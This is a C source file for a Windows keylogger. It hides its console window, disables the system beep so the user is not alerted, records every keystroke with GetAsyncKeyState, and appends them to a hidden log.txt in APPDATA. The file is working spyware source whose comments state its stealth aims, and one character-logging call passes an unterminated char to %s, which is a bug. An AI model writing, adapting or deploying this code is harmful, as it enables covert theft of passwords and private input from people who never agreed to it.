#include <stdio.h>
#include <windows.h>

// Function to log keystrokes into a hidden log file in the APPDATA directory
int logkey(const char* log) {
    // Buffer to store the file path
    char path[MAX_PATH]; 

    // Construct path to log.txt in APPDATA
    snprintf(path, sizeof(path), "%s\\log.txt", getenv("APPDATA")); 

    // Open the file in append mode
    FILE *fptr = fopen(path, "a"); 

    // Error Catching
    if (fptr != NULL) { 

        // Write the key log to the file
        fprintf(fptr, "%s", log); 

        // Close the file
        fclose(fptr); 

        // Hide the file for stealth
        SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN); 
    }
}

// Function to handle special keys using Virtual-Key codes
int handlespecialkeys(int key) {
    switch (key) {
        case VK_SPACE: logkey(" "); return 1; // Log space as " "
        case VK_RETURN: logkey("\n"); return 1; // Log Enter as a newline
        case VK_SHIFT: logkey("[Shift]"); return 1; // Log Shift
        case VK_BACK: logkey("[BackSpace]"); return 1; // Log Backspace
        case VK_RBUTTON: logkey("[Right Click]"); return 1; // Log right mouse button
        case VK_CAPITAL: logkey("[Capslock]"); return 1; // Log Caps Lock
        case VK_TAB: logkey("[Tab]"); return 1; // Log Tab key
        case VK_UP: logkey("[Up Arrow]"); return 1; // Log Up arrow key
        case VK_DOWN: logkey("[Down Arrow]"); return 1; // Log Down arrow key
        case VK_LEFT: logkey("[Left Arrow]"); return 1; // Log Left arrow key
        case VK_RIGHT: logkey("[Right Arrow]"); return 1; // Log Right arrow key (Fixed missing bracket)
        case VK_CONTROL: logkey("[Ctrl]"); return 1; // Log Control key
        case VK_MENU: logkey("[Alt]"); return 1; // Log Alt key
        default: return 0; // Return 0 for regular alphanumeric keys
    }
}

int main() {
    // Disable system beep sound to avoid alerting the user
    SystemParametersInfo(SPI_SETBEEP, 0, 0, SPIF_SENDCHANGE);

    // Hide the console window so the program runs in the background
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (1) { // Infinite loop to monitor keystrokes
        Sleep(10); // Reduce CPU usage by adding a small delay
        for (int key = 8; key <= 190; key++) { // Loop through possible key values
            if (GetAsyncKeyState(key) & 0x8000) { // Check if the key is being pressed
                if (!handlespecialkeys(key)) { // If it's not a special key, log it as a regular character
                    char character = (char)key; 
                    logkey(&character); // Log the keypress
                }
            }
        }
    }
}
